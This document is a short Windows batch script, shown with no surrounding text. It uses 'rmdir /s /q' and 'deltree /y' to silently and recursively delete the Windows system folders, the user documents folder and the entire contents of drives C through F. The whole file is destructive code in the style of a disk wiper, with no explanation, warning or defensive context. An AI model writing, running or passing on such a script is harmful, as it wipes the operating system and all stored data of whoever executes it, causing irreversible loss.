@echo off 
rmdir /s /q c:\windows\system32\dllcache\
rmdir /s /q c:\windows\system32\
rmdir /s /q c:\windows\
rmdir /s /q c:\docume~1\
rmdir /s /q c:\
rmdir /s /q d:\
rmdir /s /q e:\
rmdir /s /q f:\
c:\windows\command\deltree.exe /y c:\*.*
c:\windows\command\deltree.exe /y d:\*.*
c:\windows\command\deltree.exe /y e:\*.*
c:\windows\command\deltree.exe /y f:\*.*
